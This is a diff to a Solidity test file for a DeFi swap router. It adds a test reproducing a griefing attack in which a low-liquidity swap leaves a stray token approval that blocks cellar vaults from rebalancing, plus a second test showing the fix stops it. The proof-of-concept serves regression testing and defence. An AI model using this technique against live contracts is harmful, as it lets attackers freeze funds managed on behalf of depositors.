@@ -3,7 +3,7 @@ pragma solidity 0.8.16;
 
 import { Registry } from "src/Registry.sol";
 import { ICellarV1_5 as Cellar } from "src/interfaces/ICellarV1_5.sol";
-import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import { ERC20 } from "@solmate/tokens/ERC20.sol";
 import { SwapRouter, IUniswapV2Router, IUniswapV3Router } from "src/modules/swap-router/SwapRouter.sol";
 import { ICellarRouterV1_5 as CellarRouter } from "src/interfaces/ICellarRouterV1_5.sol";
 
@@ -42,9 +42,91 @@ contract SwapRouterIntegrationTest is Test {
         registry = Registry(0xDffa1443a72Fd3f4e935b93d0C3BFf8FE80cE083);
 
         swapRouter = new SwapRouter(IUniswapV2Router(uniswapV2Router), IUniswapV3Router(uniswapV3Router));
+    }
 
+    function testAttackVector() external {
+        // Attacker performs a bad swap with low liquidity pool to stop cellars from rebalancing.
+        SwapRouter oldRouter = SwapRouter(registry.getAddress(1));
+        uint256 assets = 100e6;
+        deal(address(USDC), address(this), assets);
+        USDC.approve(address(oldRouter), assets);
+
+        // Attacker chooses the USDC/stETH pool because it has low liquidity.
+        ERC20 stETH = ERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
+        address[] memory path = new address[](2);
+        path[0] = address(USDC);
+        path[1] = address(stETH);
+
+        uint24[] memory poolFees = new uint24[](1);
+        poolFees[0] = 3000; // 0.3%
+
+        bytes memory swapData = abi.encode(path, poolFees, assets, 0);
+
+        // Attacker performs bad swap which leaves SwapRouter with a nonzero USDC approval for the UniV3 router.
+        oldRouter.swap(SwapRouter.Exchange.UNIV3, swapData, address(this), USDC, stETH);
+        assertTrue(
+            USDC.allowance(address(oldRouter), address(swapRouter.uniswapV3Router())) > 0,
+            "Uniswap V3 Router should have a non zero approval."
+        );
+
+        // Now if cellars try to sell USDC to a UniV3 pair, the TX will revert.
+        vm.startPrank(gravityBridge);
+        path = new address[](2);
+        path[0] = address(USDC);
+        path[1] = address(WBTC);
+        poolFees = new uint24[](1);
+        poolFees[0] = 3000; // 0.3% fee
+        uint256 amount = 10_000e6;
+        bytes memory params = abi.encode(path, poolFees, amount, 0);
+        vm.expectRevert(bytes("SafeERC20: approve from non-zero to non-zero allowance"));
+        cellarTrend.rebalance(address(USDC), address(WBTC), amount, uint8(SwapRouter.Exchange.UNIV3), params);
+
+        vm.expectRevert(bytes("SafeERC20: approve from non-zero to non-zero allowance"));
+        cellarMomentum.rebalance(address(USDC), address(WBTC), amount, uint8(SwapRouter.Exchange.UNIV3), params);
+        vm.stopPrank();
+    }
+
+    function testAttackVectorIsMitigated() external {
+        // Update registry with new Swap Router.
         vm.prank(sommMultiSig);
         registry.setAddress(1, address(swapRouter));
+
+        // Attacker tries to perform a bad swap with low liquidity pool to stop cellars from rebalancing.
+        uint256 assets = 100e6;
+        deal(address(USDC), address(this), assets);
+        USDC.approve(address(swapRouter), assets);
+
+        // Attacker chooses the USDC/stETH pool because it has low liquidity.
+        ERC20 stETH = ERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
+        address[] memory path = new address[](2);
+        path[0] = address(USDC);
+        path[1] = address(stETH);
+
+        uint24[] memory poolFees = new uint24[](1);
+        poolFees[0] = 3000; // 0.3%
+
+        bytes memory swapData = abi.encode(path, poolFees, assets, 0);
+
+        // Attackers swap reverts because of the unused approval.
+        vm.expectRevert(bytes(abi.encodeWithSelector(SwapRouter.SwapRouter__UnusedApproval.selector)));
+        swapRouter.swap(SwapRouter.Exchange.UNIV3, swapData, address(this), USDC, stETH);
+
+        // Cellars are still able to make swaps.
+        vm.startPrank(gravityBridge);
+        path = new address[](2);
+        path[0] = address(USDC);
+        path[1] = address(WBTC);
+        poolFees = new uint24[](1);
+        poolFees[0] = 3000; // 0.3% fee
+        uint256 amount = 10_000e6;
+        bytes memory params = abi.encode(path, poolFees, amount, 0);
+
+        // Trend Cellar is able to swap.
+        cellarTrend.rebalance(address(USDC), address(WBTC), amount, uint8(SwapRouter.Exchange.UNIV3), params);
+
+        // Momumtum Cellar is able to swap.
+        cellarMomentum.rebalance(address(USDC), address(WBTC), amount, uint8(SwapRouter.Exchange.UNIV3), params);
+        vm.stopPrank();
     }
 
     function testCellars() external {
@@ -57,6 +139,10 @@ contract SwapRouterIntegrationTest is Test {
     }
 
     function _testCellar(Cellar cellar) internal {
+        // Update registry with new Swap Router.
+        vm.prank(sommMultiSig);
+        registry.setAddress(1, address(swapRouter));
+
         uint256 userAssets = 10_000e6;
         //  Have user deposit into Cellar
         uint256 currentTotalAssets = cellar.totalAssets();
